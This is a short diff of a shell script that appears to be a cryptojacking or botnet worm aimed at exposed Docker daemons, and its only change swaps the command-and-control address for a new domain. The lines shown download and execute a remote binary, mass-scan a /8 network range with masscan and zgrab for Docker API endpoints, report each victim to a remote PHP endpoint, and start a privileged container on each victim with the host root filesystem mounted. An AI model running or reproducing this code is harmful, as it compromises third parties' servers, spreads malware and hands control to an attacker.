@@ -17,7 +17,7 @@ function SOME_INSTALL(){
 if ! [ -d "/dev/shm/.../...NMLM.../" ] ; then mkdir -p /dev/shm/.../...NMLM.../ ; fi
 echo 'Removed for the test run in the container!'
 apk add --no-cache bash curl docker masscan libpcap-dev 
-if ! [ -f "/tmp/bioset" ] ; then curl http://45.9.150.36/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
+if ! [ -f "/tmp/bioset" ] ; then curl http://solscan.live/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
 }
 
 function TESTLAUF(){
@@ -34,7 +34,7 @@ rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
 eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
 for IPADDR in ${!rndstr}
 do echo "$IPADDR:$PORT"
-wget -q "http://45.9.150.36/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
+wget -q "http://solscan.live/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
 timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt nmlmweb3/upspin 
 RGWERT=$?
 if ! [ "$RGWERT" = "0" ] ; then
